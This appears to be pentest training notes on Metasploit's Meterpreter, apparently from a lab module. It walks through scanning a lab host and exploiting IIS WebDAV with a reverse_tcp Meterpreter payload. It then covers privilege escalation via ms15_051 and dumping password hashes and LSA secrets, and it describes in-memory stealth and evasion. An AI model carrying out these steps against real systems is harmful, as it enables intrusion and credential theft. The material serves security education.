<h3>Meterpreter</h3>

The Meterpreter Payload is a specific type of multi-faceted, extensible Payload that uses DLL injection to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.

It is dubbed the swiss army knife of pentesting, and for a good reason. The purpose of Meterpreter is to specifically improve our post-exploitation procedures, offering us a hand-picked set of relevant tools for more straightforward enumeration of the target host from the inside. It can help us find various privilege escalation techniques, AV evasion techniques, further vulnerability research, provide persistent access, pivot, etc.

For some interesting reading, check out this post on Meterpreter stageless payloads and this post on modifying Metasploit templates for evasion. These topics are outside the scope of this module, but we should be aware of these possibilities.

<h3>Running Meterpreter</h3>

To run Meterpreter, we only need to select any version of it from the show payloads output, taking into consideration the type of connection and OS we are attacking.

When the exploit is completed, the following events occur:

- The target executes the initial stager. This is usually a bind, reverse, findtag, passivex, etc.

- The stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL.

- The Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends a GET. Metasploit receives this GET and configures the client.

- Lastly, Meterpreter loads extensions. It will always load stdapi and load priv if the module gives administrative rights. All of these extensions are loaded over AES encryption.

Whenever the Meterpreter Payload is sent and run on the target system, we receive a Meterpreter shell. We can then immediately issue the help command to see what the Meterpreter shell is capable of.

<h3>MSF - Meterpreter Commands</h3>

meterpreter > help

Some of these commands are also available in the module cheat sheet for reference.

The main idea we need to get about Meterpreter is that it is just as good as getting a direct shell on the target OS but with more functionality. The developers of Meterpreter set clear design goals for the project to skyrocket in usability in the future. Meterpreter needs to be:

- Stealthy

- Powerful

- Extensible

<h3>Stealthy</h3>

Meterpreter, when launched and after arriving on the target, resides entirely in memory and writes nothing to the disk. No new processes are created either as Meterpreter injects itself into a compromised process. Moreover, it can perform process migrations from one running process to another.

With the now updated msfconsole-v6, all Meterpreter payload communications between the target host and us are encrypted using AES to ensure confidentiality and integrity of data communications.

All of these provide limited forensic evidence to be found and also little impact on the victim machine.

<h3>Powerful</h3>

Meterpreter's use of a channelized communication system between the target host and the attacker proves very useful. We can notice this first-hand when we immediately spawn a host-OS shell inside of our Meterpreter stage by opening a dedicated channel for it. This also allows for the use of AES-encrypted traffic.

<h3>Extensible</h3>

Meterpreter's features can constantly be augmented at runtime and loaded over the network. Its modular structure also allows new functionality to be added without rebuilding it.

<h3>Using Meterpreter</h3>

We have already delved into the basics of Meterpreter in the Payloads section. Now, we will look at the real strengths of the Meterpreter shell and how it can bolster the assessment's effectiveness and save time during an engagement. We start by running a basic scan against a known target. We will do this a-la-carte, doing everything from inside msfconsole to benefit from the data tracking on our target.

<h3>MSF - Scanning Target</h3>

msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15

Next, we look up some information about the services running on this box. Specifically, we want to explore port 80 and what kind of web service is hosted there.

<img width="393" height="367" alt="image" src="https://github.com/user-attachments/assets/51e95df6-03b0-4759-b31e-9a1d3703f157" />

We notice it is an under-construction website—nothing web-related to see here. However, looking at both the end of the webpage and the result of the Nmap scan more closely, we notice that the server is running Microsoft IIS httpd 6.0. So we further our research in that direction, searching for common vulnerabilities for this version of IIS. After some searching, we find the following marker for a widespread vulnerability: CVE-2017-7269. It also has a Metasploit module developed for it.

<h3>MSF - Searching for Exploit</h3>

msf6 > search iis_webdav_upload_asp

Matching Modules

================

   #  Name                                       Disclosure Date  Rank       Check  Description
   
   -  ----                                       ---------------  ----       -----  -----------
   
   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution
   


msf6 > use 0

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

We proceed to set the needed parameters. For now, these would be LHOSTand RHOST as everything else on the target seems to be running the default configuration.

<h3>MSF - Configuring Exploit & Payload</h3>

msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15

RHOST => 10.10.10.15


msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0

LHOST => tun0


msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

We have our Meterpreter shell. However, take a close look at the output above. We can see a .asp file named metasploit28857905 exists on the target system at this very moment. Once the Meterpreter shell is obtained, as mentioned before, it will reside within memory. Therefore, the file is not needed, and removal was attempted by msfconsole, which failed due to access permissions. Leaving traces like these is not beneficial to the attacker and creates a huge liability.

From the sysadmin's perspective, finding files that match this name type or slight variations of it can prove beneficial to stopping an attack in the middle of its tracks. Targeting regex matches against filenames or signatures as above will not even allow an attacker to spawn a Meterpreter shell before being cut down by the correctly configured security measures.

We proceed further with our exploits. Upon attempting to see which user we are running on, we get an access denied message. We should try migrating our process to a user with more privilege.

<h3>MSF - Meterpreter Migration</h3>

meterpreter > getuid

[-] 1055: Operation failed: Access is denied.


meterpreter > ps

Now that we have established at least some privilege level in the system, it is time to escalate that privilege. So, we look around for anything interesting, and in the C:\Inetpub\ location, we find an interesting folder named AdminScripts. However, unfortunately, we do not have permission to read what is inside it.

<h3>MSF - Interacting with the Target</h3>

c:\Inetpub>dir

dir

 Volume in drive C has no label.
 
 Volume Serial Number is 246C-D7FE

 We can easily decide to run the local exploit suggester module, attaching it to the currently active Meterpreter session. To do so, we background the current Meterpreter session, search for the module we need, and set the SESSION option to the index number for the Meterpreter session, binding the module to it.

<h3>MSF - Session Handling</h3>

meterpreter > bg

Background session 1? [y/N]  y


msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

Matching Modules

================

msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0

msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   
   ----             ---------------  --------  -----------
   
   SESSION                           yes       The session to run this module on
   
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1

SESSION => 1


msf6 post(multi/recon/local_exploit_suggester) > run

Running the recon module presents us with a multitude of options. Going through each separate one, we land on the ms15_051_client_copy_image entry, which proves to be successful. This exploit lands us directly within a root shell, giving us total control over the target system.

<h3>MSF - Privilege Escalation</h3>

msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

From here, we can proceed to use the plethora of Meterpreter functionalities. For example, extracting hashes, impersonating any process we want, and others.

<h3>MSF - Dumping Hashes</h3>

meterpreter > hashdump

<h3>MSF - Meterpreter LSA Secrets Dump</h3>

meterpreter > lsa_dump_secrets

From this point, if the machine was connected to a more extensive network, we could use this loot to pivot through the system, gain access to internal resources and impersonate users with a higher level of access if the overall security posture of the network is weak.

